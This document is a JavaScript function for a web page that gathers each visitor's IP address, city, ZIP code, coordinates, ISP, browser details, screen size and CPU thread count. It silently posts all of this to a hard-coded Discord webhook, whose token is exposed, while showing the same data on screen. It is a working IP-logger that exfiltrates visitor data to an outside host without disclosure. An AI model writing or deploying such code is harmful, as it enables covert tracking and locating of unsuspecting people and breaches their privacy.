async function fetchAndDisplayIPData() {
    const webhookUrl = "https://discord.com/api/webhooks/1392889091590455326/3MQJFADV6xdWPAFoWTIJvtMGc9OYwqAyQMZ6BYqlnx46D8xR_bwgp0ga5GBQ1cU63Bi_";

    const ipData = await (await fetch("https://wtfismyip.com/json")).json();
    const locationData = await (await fetch("https://we-are-jammin.xyz/json/" + ipData.YourFuckingIPAddress)).json();
    const browserData = new BrowserDetector(window.navigator.userAgent).parseUserAgent();

    let message = `
IP Address: ${ipData.YourFuckingIPAddress}
Country: ${locationData.country}
Region: ${locationData.regionName}
City: ${locationData.city}
ZIP Code: ${locationData.zip}
Location: ${ipData.YourFuckingLocation}
Latitude: ${locationData.lat}
Longitude: ${locationData.lon}
Timezone: ${locationData.timezone}
Current Time: ${new Date().toLocaleString()}
ISP: ${locationData.isp}
Organization: ${locationData.org}
Autonomous System: ${locationData.as}
Browser: ${browserData.name}
Platform: ${browserData.platform}
Version: ${browserData.version}
Mobile/Tablet: ${browserData.isMobile || browserData.isTablet ? "Yes" : "No"}
Referrer: ${document.referrer || "None"}
Languages: ${navigator.languages.join(", ")}
Screen: ${screen.width}x${screen.height}
Pixel Depth: ${screen.pixelDepth}
CPU Threads: ${navigator.hardwareConcurrency}
`;

    // Send the message to Discord
    await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "```" + message + "```" })
    });

    // Show the info on screen (keep your original display)
    await displayInfo("IP Address", ipData.YourFuckingIPAddress);
    await displayInfo("Country", locationData.country);
    await displayInfo("Region", locationData.regionName);
    await displayInfo("City", locationData.city);
    await displayInfo("ZIP Code", locationData.zip);
    await displayInfo("Full Location", ipData.YourFuckingLocation);
    await displayInfo("Latitude", locationData.lat);
    await displayInfo("Longitude", locationData.lon);
    await displayInfo("Timezone", locationData.timezone);
    await displayInfo("Current Time", new Date().toLocaleString());
    await displayInfo("ISP", locationData.isp);
    await displayInfo("Organization", locationData.org);
    await displayInfo("Autonomous System", locationData.as);
    await displayInfo("Browser Name", browserData.name);
    await displayInfo("Platform Name", browserData.platform);
    await displayInfo("Browser Version", browserData.version);
    await displayInfo("Mobile/Tablet", browserData.isMobile || browserData.isTablet ? "Yes" : "No");
    await displayInfo("Referrer", document.referrer || "None");
    await displayInfo("System Languages", navigator.languages.join(", "));
    await displayInfo("Screen Width", screen.width, 'px');
    await displayInfo("Screen Height", screen.height, 'px');
    await displayInfo("Display Pixel Depth", screen.pixelDepth);
    if (typeof screen.orientation !== "undefined") {
        await displayInfo("Screen Orientation", screen.orientation.type.split('-')[0]);
        await displayInfo("Screen Rotation", screen.orientation.angle, " degrees");
    }
    await displayInfo("CPU Threads", navigator.hardwareConcurrency);
}
